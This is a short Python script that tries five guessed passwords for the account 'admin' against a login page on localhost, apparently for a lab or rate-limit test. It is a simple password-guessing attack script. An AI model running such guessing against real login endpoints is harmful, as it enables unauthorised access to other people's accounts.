import requests
import time

TARGET = "http://127.0.0.1:5000/login"

payloads = [
    {"username": "admin", "password": "123"},
    {"username": "admin", "password": "test"},
    {"username": "admin", "password": "root"},
    {"username": "admin", "password": "pass"},
    {"username": "admin", "password": "guessme"},
]

for p in payloads:
    r = requests.post(TARGET, data=p)
    print("Tried:", p["password"], "Status:", r.status_code)
    time.sleep(1)